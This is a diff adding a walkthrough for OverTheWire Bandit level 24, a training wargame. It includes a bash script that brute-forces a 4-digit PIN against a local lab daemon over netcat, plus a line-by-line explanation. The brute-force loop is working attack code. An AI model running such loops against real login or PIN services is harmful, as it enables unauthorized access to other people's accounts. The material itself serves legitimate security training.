@@ -1,1 +1,30 @@
+ssh bandit24@bandit.labs.overthewire.org -p 2220 
+
+In this level, a daemon is listening on port 30002. When you connect using netcat, it asks for a password and a PIN combination.
+
+Each time you try a combination, if it's wrong, it responds with something like: Wrong! Please enter the correct combination.
+This predictable response allows us to automate the process and brute force all possible combinations to find the correct one.
+
+You need to: Try all 4-digit PINs (0000 to 9999) with your current level's password.
+
+Identify the correct combination by filtering out incorrect responses.
+
+Write a script in tmp folder to brute force all possible combinations:
+#!/bin/bash
+# Save current level's password in a variable
+password="the_current_password_here"
+# Loop through all 4-digit PINs from 0000 to 9999
+for pin in $(seq -w 0000 9999); do
+    echo "$password $pin" | nc localhost 30002 
+done | grep -v "Wrong!"
+
+What Each Line Does:
+#!/bin/bash → Declares the script as a bash shell script.
+password="the_current_password_here" → Replace this with the actual password for bandit24.
+for pin in $(seq -w 0000 9999); do → Loops from 0000 to 9999, ensuring leading zeros are preserved using -w.
+echo "$password $pin" | nc localhost 30002 → Sends each password+PIN combination to the daemon via Netcat.
+
+When the correct combination is found, the daemon will respond with the password for the next level, and it will not contain the word Wrong!.
+That’s what will be displayed in your terminal output.
+
 
